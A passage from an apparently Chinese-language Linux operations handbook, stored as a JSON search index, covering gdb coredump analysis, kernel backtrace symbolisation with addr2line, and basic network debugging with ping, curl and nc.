/usr/lib/libgdk-3.so.0\n#10 0x00007408c3444fa9 in gdk_display_get_event () at /usr/lib/libgdk-3.so.0\n#11 0x00007408c3480208 in ??? () at /usr/lib/libgdk-3.so.0\n#12 0x00007408c8ee8f69 in g_main_dispatch (context=0x60166aa114b0) at ../glib/glib/gmain.c:3476\n#13 0x00007408c8f473a7 in g_main_context_dispatch_unlocked (context=0x60166aa114b0) at ../glib/glib/gmain.c:4284\n#14 g_main_context_iterate_unlocked.isra.0\n    (context=context@entry=0x60166aa114b0, block=block@entry=1, dispatch=dispatch@entry=1, self=&lt;optimized out&gt;)\n    at ../glib/glib/gmain.c:4349\n#15 0x00007408c8ee7162 in g_main_context_iteration (context=context@entry=0x60166aa114b0, may_block=may_block@entry=1)\n    at ../glib/glib/gmain.c:4414\n#16 0x00007408c8c95b66 in g_application_run (application=0x60166abe9ce0 [GtkApplication], argc=&lt;optimized out&gt;, argv=0x0)\n    at ../glib/gio/gapplication.c:2577\n#17 0x00007408ca373596 in ??? () at /usr/lib/libffi.so.8\n#18 0x00007408ca37000e in ??? () at /usr/lib/libffi.so.8\n#19 0x00007408ca372bd3 in ffi_call () at /usr/lib/libffi.so.8\n#20 0x00007408c90566d1 in ??? () at /usr/lib/python3.11/site-packages/gi/_gi.cpython-311-x86_64-linux-gnu.so\n#21 0x00007408c9055090 in ??? () at /usr/lib/python3.11/site-packages/gi/_gi.cpython-311-x86_64-linux-gnu.so\n#22 0x00007408c9f98366 in _PyObject_Call\n    (kwargs=&lt;optimized out&gt;, args=0x7408bb5b3140, callable=0x7408c4561470, tstate=0x7408ca30d6d8 &lt;_PyRuntime+166328&gt;)\n    at Objects/call.c:343\n#23 PyObject_Call (callable=0x7408c4561470, args=0x7408bb5b3140, kwargs=&lt;optimized out&gt;) at Objects/call.c:355\n#24 0x00007408c9f6a64d in do_call_core\n    (use_tracing=&lt;optimized out&gt;, kwdict=0x7408bb575d80, callargs=0x7408bb5b3140, func=0x7408c4561470, tstate=&lt;optimized out&gt;)\n    at Python/ceval.c:7349\n#25 _PyEval_EvalFrameDefault (tstate=&lt;optimized out&gt;, frame=&lt;optimized out&gt;, throwflag=&lt;optimized out&gt;) at Python/ceval.c:5376\n#26 0x00007408ca01fae4 in _PyEval_EvalFrame (throwflag=0, frame=0x7408ca403020, tstate=0x7408ca30d6d8 &lt;_PyRuntime+166328&gt;)\n    at ./Include/internal/pycore_ceval.h:73\n#27 _PyEval_Vector\n    (tstate=tstate@entry=0x7408ca30d6d8 &lt;_PyRuntime+166328&gt;, func=func@entry=0x7408c9b06020, locals=locals@entry=0x7408c9b26c80, args=args@entry=0x0, argcount=argcount@entry=0, kwnames=kwnames@entry=0x0) at Python/ceval.c:6434\n#28 0x00007408ca01f4cc in PyEval_EvalCode (co=0x7408c9af8620, globals=&lt;optimized out&gt;, locals=0x7408c9b26c80) at Python/ceval.c:1148\n#29 0x00007408ca03cd03 in run_eval_code_obj\n    (tstate=tstate@entry=0x7408ca30d6d8 &lt;_PyRuntime+166328&gt;, co=co@entry=0x7408c9af8620, globals=globals@entry=0x7408c9b26c80, locals=locals@entry=0x7408c9b26c80) at Python/pythonrun.c:1741\n#30 0x00007408ca038e0a in run_mod\n    (mod=mod@entry=0x60166a2cd578, filename=filename@entry=0x7408c9ad4580, globals=globals@entry=0x7408c9b26c80, locals=locals@entry=0x7408c9b26c80, flags=flags@entry=0x7ffd781984f8, arena=arena@entry=0x7408c9a4f7b0) at Python/pythonrun.c:1762\n#31 0x00007408ca04f383 in pyrun_file\n    (fp=fp@entry=0x60166a23d470, filename=filename@entry=0x7408c9ad4580, start=start@entry=257, globals=globals@entry=0x7408c9b26c80, locals=locals@entry=0x7408c9b26c80, closeit=closeit@entry=1, flags=0x7ffd781984f8) at Python/pythonrun.c:1657\n#32 0x00007408ca04ecf5 in _PyRun_SimpleFileObject (fp=0x60166a23d470, filename=0x7408c9ad4580, closeit=1, flags=0x7ffd781984f8)\n    at Python/pythonrun.c:440\n#33 0x00007408ca04d5f8 in _PyRun_AnyFileObject (fp=0x60166a23d470, filename=0x7408c9ad4580, closeit=1, flags=0x7ffd781984f8)\n    at Python/pythonrun.c:79\n#34 0x00007408ca048098 in pymain_run_file_obj (skip_source_first_line=0, filename=0x7408c9ad4580, program_name=0x7408c9b26ef0)\n    at Modules/main.c:360\n#35 pymain_run_file (config=0x7408ca2f3720 &lt;_PyRuntime+59904&gt;) at Modules/main.c:379\n#36 pymain_run_python (exitcode=0x7ffd781984f0) at Modules/main.c:601\n#37 Py_RunMain () at Modules/main.c:680\n#38 0x00007408ca0131eb in Py_BytesMain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at Modules/main.c:734\n#39 0x00007408c9c43cd0 in __libc_start_call_main\n    (main=main@entry=0x601669c16120 &lt;main&gt;, argc=argc@entry=2, argv=argv@entry=0x7ffd78198748)\n    at ../sysdeps/nptl/libc_start_call_main.h:58\n#40 0x00007408c9c43d8a in __libc_start_main_impl\n    (main=0x601669c16120 &lt;main&gt;, argc=2, argv=0x7ffd78198748, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffd78198738) at ../csu/libc-start.c:360\n#41 0x0000601669c16045 in _start ()\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c<code>bt full</code> \u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u7ebf\u7a0b\u200b\u5b8c\u6574\u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\uff0c<code>thread apply all bt full</code> \u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u6240\u6709\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u5b8c\u6574\u200b\u8c03\u7528\u200b\u6808\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u5728\u200b\u6c47\u62a5\u200b bug \u200b\u65f6\u4f1a\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u5c1d\u8bd5\u200b\u4ece\u200b coredump \u200b\u83b7\u53d6\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u547d\u4ee4\u200b\u4e5f\u200b\u4f1a\u200b\u6709\u200b\u5e2e\u52a9\u200b\uff1a</p> <ul> <li><code>up</code>/<code>down</code>\uff1a\u200b\u5207\u6362\u200b\u5230\u200b\u4e0a\u200b\u4e00\u5c42\u200b/\u200b\u4e0b\u200b\u4e00\u5c42\u200b\u8c03\u7528\u200b\u6808\u200b</li> <li><code>info args</code> \u200b\u4e0e\u200b <code>info locals</code>\uff1a\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u51fd\u6570\u200b\u7684\u200b\u53c2\u6570\u200b\u4e0e\u200b\u5c40\u90e8\u53d8\u91cf\u200b\u3002\u200b\u7531\u4e8e\u200b\u7f16\u8bd1\u5668\u200b\u4f18\u5316\u200b\uff0c\u200b\u4e00\u90e8\u5206\u200b\u53d8\u91cf\u200b\u4f1a\u200b\u53d8\u6210\u200b <code>&lt;optimized out&gt;</code>\uff0c\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u4f1a\u200b\u4e22\u5931\u200b</li> <li><code>l</code>\uff1a\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u51fd\u6570\u200b\u7684\u200b\u6e90\u7801\u200b</li> <li><code>print xxx</code>\uff1a\u200b\u6253\u5370\u200b\u53d8\u91cf\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u53c2\u6570\u200b\u652f\u6301\u200b\u8868\u8fbe\u5f0f\u200b\uff08\u200b\u9700\u8981\u200b\u5bf9\u200b C \u200b\u7684\u200b\u6307\u9488\u200b\u4e0e\u200b\u7c7b\u578b\u200b\u7cfb\u7edf\u200b\u6709\u200b\u4e00\u5b9a\u200b\u7684\u200b\u4e86\u89e3\u200b\uff09</li> </ul> <p>Debian/Ubuntu \u200b\u7684\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u4e0d\u200b\u5305\u542b\u200b\u6e90\u4ee3\u7801\u200b\u6587\u4ef6\u200b</p> <p>\u200b\u5728\u200b\u5b89\u88c5\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u5c1d\u8bd5\u200b\u5728\u200b gdb \u200b\u4e2d\u200b\u4f7f\u7528\u200b <code>l</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u6e90\u7801\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u65e0\u6cd5\u200b\u663e\u793a\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ee5\u200b coreutils \u200b\u7684\u200b <code>yes</code> \u200b\u7a0b\u5e8f\u200b\u4e3a\u4f8b\u200b\uff1a</p> <pre><code>(gdb) b main\nBreakpoint 1 at 0x2330: file src/yes.c, line 62.\n(gdb) r\nStarting program: /usr/bin/yes \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nBreakpoint 1, main (argc=1, argv=0x7fffffffe018) at src/yes.c:62\n62  src/yes.c: No such file or directory.\n(gdb) l\n57  in src/yes.c\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>apt source</code> \u200b\u4e0b\u8f7d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\uff08\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\u53ef\u200b\u53c2\u8003\u200b\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u76f8\u5173\u200b\u90e8\u5206\u200b\uff09\u3002<code>apt source</code> \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5e94\u7528\u200b Debian \u200b\u76f8\u5173\u200b\u8865\u4e01\u200b\u3002\u200b\u7136\u540e\u200b\u5728\u200b gdb \u200b\u4e2d\u200b\u4f7f\u7528\u200b <code>dir</code> \u200b\u547d\u4ee4\u200b\u6dfb\u52a0\u200b\u6e90\u4ee3\u7801\u200b\u76ee\u5f55\u200b\uff1a</p> <pre><code>(gdb) dir /path/to/coreutils-9.1/\nSource directories searched: /path/to/coreutils-9.1:$cdir:$cwd\n(gdb) l\n57  \n58  int\n59  main (int argc, char **argv)\n60  {\n61    initialize_main (&amp;argc, &amp;argv);\n62    set_program_name (argv[0]);\n63    setlocale (LC_ALL, \"\");\n64    bindtextdomain (PACKAGE, LOCALEDIR);\n65    textdomain (PACKAGE);\n66\n</code></pre> <p>\u200b\u4e86\u89e3\u200b\u5185\u6838\u200b backtrace \u200b\u5bf9\u5e94\u200b\u6e90\u4ee3\u7801\u200b\u6587\u4ef6\u200b\u4e0e\u200b\u884c\u53f7\u200b</p> <p>\u200b\u5728\u200b\u8c03\u8bd5\u200b\u4e0e\u200b\u5185\u6838\u200b\u6709\u5173\u200b\u7684\u200b\u95ee\u9898\u200b\u65f6\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u9700\u8981\u200b\u5224\u65ad\u200b\u5185\u6838\u200b\u8f93\u51fa\u200b\u7684\u200b backtrace \u200b\u4fe1\u606f\u200b\u91cc\u200b\u6bcf\u4e2a\u200b\u51fd\u6570\u200b\u7684\u200b\u5177\u4f53\u4f4d\u7f6e\u200b\u3002\u200b\u4f8b\u5982\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u7531\u200b SysRq \u200b\u7684\u200b <code>l</code> \u200b\u547d\u4ee4\u200b\u89e6\u53d1\u200b\u7684\u200b\u5411\u200b dmesg \u200b\u8f93\u51fa\u200b\u6240\u6709\u200b\u6d3b\u8dc3\u200b\u6838\u5fc3\u200b\u5f53\u524d\u200b\u6808\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>[  243.860496] sysrq: Show backtrace of all active CPUs\n[  243.860505] NMI backtrace for cpu 0\n[  243.860507] CPU: 0 UID: 0 PID: 3660 Comm: tee Tainted: P           OE      6.12.38+deb13-amd64 #1  Debian 6.12.38-1\n[  243.860510] Tainted: [P]=PROPRIETARY_MODULE, [O]=OOT_MODULE, [E]=UNSIGNED_MODULE\n[  243.860511] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS Arch Linux 1.17.0-1-1 04/01/2014\n[  243.860514] Call Trace:\n[  243.860525]  &lt;TASK&gt;\n[  243.860530]  dump_stack_lvl+0x5d/0x80\n[  243.860546]  nmi_cpu_backtrace.cold+0x19/0x68\n[  243.860548]  ? __pfx_nmi_raise_cpu_backtrace+0x10/0x10\n[  243.860560]  nmi_trigger_cpumask_backtrace+0xed/0x100\n[  243.860569]  __handle_sysrq.cold+0x9c/0xe6\n[  243.860577]  write_sysrq_trigger+0x59/0xb0\n[  243.860590]  proc_reg_write+0x57/0xa0\n[  243.860601]  vfs_write+0xf5/0x450\n[  243.860612]  ksys_write+0x6d/0xf0\n[  243.860614]  do_syscall_64+0x82/0x190\n[  243.860616]  ? __count_memcg_events+0x53/0xf0\n[  243.860619]  ? count_memcg_events.constprop.0+0x1a/0x30\n[  243.860625]  ? handle_mm_fault+0x1bb/0x2c0\n[  243.860628]  ? do_user_addr_fault+0x36c/0x620\n[  243.860630]  ? exc_page_fault+0x7e/0x180\n[  243.860633]  entry_SYSCALL_64_after_hwframe+0x76/0x7e\n</code></pre> <p>\u200b\u5c3d\u7ba1\u200b\u51fd\u6570\u200b\u540d\u200b\u7684\u200b\u641c\u7d22\u200b\u76f8\u5bf9\u200b\u7b80\u5355\u200b\uff0c\u200b\u4f46\u662f\u200b\u600e\u4e48\u200b\u5b9a\u4f4d\u200b\u6808\u4e0a\u200b\u7684\u200b\u67d0\u4e2a\u200b\u51fd\u6570\u200b\u5177\u4f53\u200b\u8fd0\u884c\u200b\u5728\u200b\u54ea\u200b\u4e00\u884c\u200b\u5462\u200b\uff1f\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Linux \u200b\u5185\u6838\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\uff08\u200b\u5b8c\u6574\u200b\u7684\u200b <code>vmlinux</code>\uff09\u200b\u4e0e\u200b <code>addr2line</code> \u200b\u5de5\u5177\u200b\u5b9a\u4f4d\u200b\u3002\u200b\u5728\u200b Debian \u200b\u4e0a\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u6e90\u540e\u200b\u5b89\u88c5\u200b\u5f53\u524d\u200b\u8fd0\u884c\u200b\u5185\u6838\u200b\u5bf9\u5e94\u200b\u7684\u200b dbg \u200b\u5305\u200b\u3002\u200b\u6ce8\u610f\u200b\u5185\u6838\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u5f88\u5927\u200b\uff0c\u200b\u9700\u8981\u200b\u7559\u51fa\u200b\u8db3\u591f\u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>sudo apt install linux-image-$(uname -r)-dbg\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u4f7f\u7528\u200b <code>addr2line</code> \u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>$ addr2line -e /usr/lib/debug/boot/vmlinux-$(uname -r) nmi_trigger_cpumask_backtrace+0xed/0x100\ndebian/build/build_amd64_none_amd64/lib/nmi_backtrace.c:62\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u7ed3\u5408\u200b <code>apt source</code> \u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b\u6709\u200b Debian \u200b\u8865\u4e01\u200b\u7684\u200b\u5185\u6838\u200b\u6e90\u4ee3\u7801\u200b\u67e5\u770b\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0ccoredump \u200b\u53ea\u200b\u5305\u542b\u200b\u4e86\u200b\u5d29\u6e83\u200b\u73b0\u573a\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5d29\u6e83\u200b\u7684\u200b\u539f\u56e0\u200b\u6709\u200b\u53ef\u80fd\u200b\u5e76\u200b\u4e0d\u200b\u5728\u200b coredump \u200b\u4e2d\u200b\uff1a \u200b\u4f8b\u5982\u200b\u5728\u200b\u4e4b\u524d\u200b\u7684\u200b\u6267\u884c\u200b\u4e2d\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u5df2\u7ecf\u200b\u5411\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff0c\u200b\u53ea\u662f\u200b\u6ca1\u6709\u200b\u7acb\u523b\u200b\u89e6\u53d1\u200b\u95ee\u9898\u200b\u3002 \u200b\u8fd9\u200b\u5c31\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6392\u67e5\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u4f7f\u7528\u200b <code>valgrind</code> \u200b\u68c0\u67e5\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u6216\u8005\u200b\u7f16\u8bd1\u200b\u65f6\u200b\u5c31\u200b\u6dfb\u52a0\u200b AddressSanitizer \u200b\u7b49\u200b\u5de5\u5177\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u53ea\u200b\u9700\u8981\u200b\u770b\u5230\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u8c03\u7528\u200b\u5806\u6808\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u200b\u7a0b\u5e8f\u200b\u8fdb\u884c\u200b\u8c03\u8bd5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>pstack</code> \u200b\u6216\u200b <code>eu-stack</code>\uff08\u200b\u5728\u200b <code>elfutils</code> \u200b\u5305\u4e2d\u200b\uff09\u200b\u7b49\u200b\u5de5\u5177\u200b\u3002</p>"},{"location":"ops/debug/#network-debug","title":"\u7f51\u7edc\u200b\u95ee\u9898\u200b\u8c03\u8bd5\u200b\u7b80\u4ecb","text":"<p>\u200b\u672c\u200b\u8282\u200b\u4ecb\u7ecd\u200b\u7b80\u5355\u200b\u7684\u200b\u7f51\u7edc\u200b\u95ee\u9898\u200b\u7684\u200b\u8c03\u8bd5\u200b\u65b9\u6cd5\u200b\u4e0e\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u7f51\u7edc\u200b\u95ee\u9898\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\u3002</p>"},{"location":"ops/debug/#connectivity-issues","title":"\u8fde\u901a\u6027\u200b\u95ee\u9898","text":""},{"location":"ops/debug/#ping","title":"ping","text":"<p>\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u8fde\u63a5\u200b\u6b63\u5e38\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u65b9\u5f0f\u200b\u662f\u200b\u4f7f\u7528\u200b <code>ping</code> \u200b\u547d\u4ee4\u200b\u3002\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\uff0c<code>ping</code> \u200b\u4f1a\u200b\u4e0d\u505c\u200b\u5411\u200b\u76ee\u6807\u200b\u5730\u5740\u200b\u53d1\u9001\u200b ICMP Echo Request \u200b\u5305\u200b\uff0c\u200b\u5982\u679c\u200b\u76ee\u6807\u200b\u5730\u5740\u200b\u7f51\u7edc\u200b\u7545\u901a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9632\u706b\u5899\u200b\u914d\u7f6e\u200b\u5141\u8bb8\u200b\u54cd\u5e94\u200b Echo Request \u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6536\u5230\u200b Echo Reply \u200b\u5305\u200b\u3002</p> <pre><code>$ ping www.example.com\nPING www.example.com (2600:1417:4400:24::17d2:7a6) 56 data bytes\n64 bytes from g2600-1417-4400-0024-0000-0000-17d2-07a6.deploy.static.akamaitechnologies.com (2600:1417:4400:24::17d2:7a6): icmp_seq=1 ttl=50 time=60.2 ms\n64 bytes from g2600-1417-4400-0024-0000-0000-17d2-07a6.deploy.static.akamaitechnologies.com (2600:1417:4400:24::17d2:7a6): icmp_seq=2 ttl=50 time=60.4 ms\n^C\n--- www.example.com ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms\nrtt min/avg/max/mdev = 60.158/60.300/60.443/0.142 ms\n$ # \u200b\u67d0\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u901a\u8fc7\u200b -4 \u200b\u6216\u8005\u200b -6 \u200b\u6307\u5b9a\u200b\u4f7f\u7528\u200b IPv4 \u200b\u6216\u8005\u200b IPv6\n$ ping -4 www.example.com\nPING www.example.com (104.116.243.80) 56(84) bytes of data.\n64 bytes from a104-116-243-80.deploy.static.akamaitechnologies.com (104.116.243.80): icmp_seq=1 ttl=44 time=81.7 ms\n64 bytes from a104-116-243-80.deploy.static.akamaitechnologies.com (104.116.243.80): icmp_seq=2 ttl=44 time=81.9 ms\n^C\n--- www.example.com ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms\nrtt min/avg/max/mdev = 81.736/81.799/81.863/0.063 ms\n</code></pre> <p><code>ping</code> \u200b\u7684\u200b\u5c40\u9650\u6027\u200b\u5728\u4e8e\u200b\uff0c\u200b\u5373\u4f7f\u200b <code>ping</code> \u200b\u6210\u529f\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\u7684\u200b\u670d\u52a1\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u3001\u200b\u4f20\u8f93\u200b TCP \u200b\u6216\u200b UDP \u200b\u5305\u200b\u6b63\u5e38\u200b\uff1b\u200b\u5373\u4f7f\u200b <code>ping</code> \u200b\u5931\u8d25\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\u7684\u200b\u670d\u52a1\u200b\u4e0d\u53ef\u200b\u7528\u200b\u3002</p>"},{"location":"ops/debug/#curl","title":"curl","text":"<p>\u200b\u5177\u4f53\u200b\u7684\u200b\u670d\u52a1\u200b\u4e00\u822c\u200b\u4e5f\u200b\u6709\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6d4b\u8bd5\u5de5\u5177\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5bf9\u200b HTTP(S) \u200b\u7c7b\u200b\u670d\u52a1\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>curl</code> \u200b\u6d4b\u8bd5\u200b\u3002\u200b\u6dfb\u52a0\u200b <code>-v</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u8be6\u7ec6\u200b\u7684\u200b\u8bf7\u6c42\u200b\u4e0e\u200b\u54cd\u5e94\u200b\u4fe1\u606f\u200b\uff0c\u200b\u800c\u200b\u6dfb\u52a0\u200b <code>-I</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b HEAD \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u907f\u514d\u200b\u7ec8\u7aef\u200b\u8f93\u51fa\u200b\u8fc7\u591a\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u4e0e\u200b <code>ping</code> \u200b\u7c7b\u4f3c\u200b\uff0c<code>-4</code> \u200b\u4e0e\u200b <code>-6</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u4f7f\u7528\u200b IPv4 \u200b\u6216\u8005\u200b IPv6\u3002</p> <code>curl -I -v</code> \u200b\u6837\u4f8b\u200b\u8f93\u51fa\u200b <pre><code>$ curl -I -v https://www.example.com\n* Host www.example.com:443 was resolved.\n* IPv6: 2600:1417:4400:24::17d2:7b3, 2600:1417:4400:24::17d2:7a6\n* IPv4: 104.116.243.80, 104.116.243.152\n*   Trying [2600:1417:4400:24::17d2:7b3]:443...\n* Connected to www.example.com (2600:1417:4400:24::17d2:7b3) port 443\n* ALPN: curl offers h2,http/1.1\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n*  CAfile: /etc/ssl/certs/ca-certificates.crt\n*  CApath: /etc/ssl/certs\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / id-ecPublicKey\n* ALPN: server accepted h2\n* Server certificate:\n*  subject: C=US; ST=California; L=Los Angeles; O=Internet Corporation for Assigned Names and Numbers; CN=*.example.com\n*  start date: Jan 15 00:00:00 2025 GMT\n*  expire date: Jan 15 23:59:59 2026 GMT\n*  subjectAltName: host \"www.example.com\" matched cert's \"*.example.com\"\n*  issuer: C=US; O=DigiCert Inc; CN=DigiCert Global G3 TLS ECC SHA384 2020 CA1\n*  SSL certificate verify ok.\n*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA384\n*   Certificate level 1: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384\n*   Certificate level 2: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384\n* using HTTP/2\n* [HTTP/2] [1] OPENED stream for https://www.example.com/\n* [HTTP/2] [1] [:method: HEAD]\n* [HTTP/2] [1] [:scheme: https]\n* [HTTP/2] [1] [:authority: www.example.com]\n* [HTTP/2] [1] [:path: /]\n* [HTTP/2] [1] [user-agent: curl/8.5.0]\n* [HTTP/2] [1] [accept: */*]\n&gt; HEAD / HTTP/2\n&gt; Host: www.example.com\n&gt; User-Agent: curl/8.5.0\n&gt; Accept: */*\n&gt;\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* old SSL session ID is stale, removing\n&lt; HTTP/2 200\nHTTP/2 200\n&lt; accept-ranges: bytes\naccept-ranges: bytes\n&lt; content-type: text/html\ncontent-type: text/html\n&lt; etag: \"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134\"\netag: \"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134\"\n&lt; last-modified: Mon, 13 Jan 2025 20:11:20 GMT\nlast-modified: Mon, 13 Jan 2025 20:11:20 GMT\n&lt; content-length: 1256\ncontent-length: 1256\n&lt; cache-control: max-age=681\ncache-control: max-age=681\n&lt; date: Wed, 23 Apr 2025 17:06:41 GMT\ndate: Wed, 23 Apr 2025 17:06:41 GMT\n&lt; alt-svc: h3=\":443\"; ma=93600,h3-29=\":443\"; ma=93600,quic=\":443\"; ma=93600; v=\"43\"\nalt-svc: h3=\":443\"; ma=93600,h3-29=\":443\"; ma=93600,quic=\":443\"; ma=93600; v=\"43\"\n\n&lt;\n* Connection #0 to host www.example.com left intact\n</code></pre>"},{"location":"ops/debug/#nc","title":"nc","text":"<p>\u200b\u5bf9\u4e8e\u200b\u7b80\u5355\u200b\u7684\u200b\u7eaf\u200b\u6587\u672c\u200b\u534f\u8bae\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>nc</code>\uff08netcat\uff09\u200b\u547d\u4ee4\u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u4ee5\u200b\u8fde\u63a5\u200b <code>www.example.com</code> \u200b\u7684\u200b 80 \u200b\u7aef\u53e3\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8f93\u5165\u200b HTTP \u200b\u8bf7\u6c42\u200b\u884c\u548c\u5934\u200b\uff0c\u200b\u6309\u200b\u4e24\u4e0b\u200b\u56de\u8f66\u200b\uff08\u200b\u4ee3\u8868\u200b HTTP \u200b\u8bf7\u6c42\u200b\u7ed3\u675f\u200b\uff09\uff0c\u200b\u5373\u53ef\u200b\u6536\u5230\u200b\u54cd\u5e94\u200b\uff1a</p> <pre><code>$ nc www.example.com 80\nGET / HTTP/1.0\nHost: www.example.com\n\n\uff08\u200b\u54cd\u5e94\u200b\u5185\u5bb9\u200b\uff09\n</code></pre> <p>\u200b\u5373\u4f7f\u200b\u662f\u975e\u200b\u7eaf\u200b\u6587\u672c\u200b\u534f\u8bae\u200b\uff0c<code>nc</code> \u200b\u4e5f\u200b\u53ef\u200b\u7528\u4e8e\u200b\u63a2\u6d4b\u200b\u7aef\u53e3\u200b\u662f\u5426\u200b\u5f00\u653e\u200b\uff0c\u200b\u4ee5\u200b 22\uff08SSH\uff09\u200b\u7aef\u53e3\u200b\u4e3a\u4f8b\u200b\uff1a</p> <pre><code>$ nc &lt;\u200b\u5730\u5740\u200b&gt; 22\nSSH-2.0-OpenSSH_9.2p1 